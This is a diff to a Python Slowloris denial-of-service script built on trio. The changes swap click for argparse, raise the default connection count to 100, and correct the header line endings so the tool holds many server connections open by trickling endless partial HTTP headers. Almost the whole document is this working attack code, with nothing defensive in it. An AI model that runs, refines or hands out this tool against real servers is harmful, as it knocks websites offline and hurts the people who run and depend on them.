@@ -1,9 +1,9 @@
 from random import random
 from functools import partial
 from contextvars import ContextVar
+from argparse import ArgumentParser
 
 import trio
-import click
 
 
 task_name = ContextVar('task_name')
@@ -26,15 +26,16 @@ async def slowloris(host, port, interval, cons):
                 log('opening tcp stream...')
                 stream = await trio.open_tcp_stream(host, port)
 
-                log('sending request...')
-                await stream.send_all(b'GET /?r=%r HTTP/1.1\r\n' % random())
+                async with stream:
+                    log('sending request...')
+                    await stream.send_all(b'GET /?r=%r HTTP/1.1\r\n' % random())
 
-                while True:
-                    log('sending headers...')
-                    await stream.send_all(b'X-X: %r' % random())
+                    while True:
+                        log('sending headers...')
+                        await stream.send_all(b'X-X: %r\r\n' % random())
 
-                    log('sleeping...')
-                    await trio.sleep(interval)
+                        log('sleeping...')
+                        await trio.sleep(interval)
 
             except trio.BrokenResourceError as e:
                 log(f'error: {e!r}')
@@ -48,13 +49,17 @@ async def slowloris(host, port, interval, cons):
             nursery.start_soon(worker, i)
 
 
-@click.argument('port', type=click.INT, default=80)
-@click.argument('host')
-@click.option('-i', '--interval', type=click.INT, default=10)
-@click.option('-c', '--cons', type=click.INT, default=50)
-@click.command()
-def main(**kwargs):
-    trio.run(partial(slowloris, **kwargs))
+def main():
+    parser = ArgumentParser()
+
+    parser.add_argument('--host', default='localhost')
+    parser.add_argument('--port', type=int, default=80)
+    parser.add_argument('--interval', type=int, default=10)
+    parser.add_argument('--cons', type=int, default=100)
+
+    args = parser.parse_args()
+
+    trio.run(partial(slowloris, **args.__dict__))
 
 
 if __name__ == '__main__':
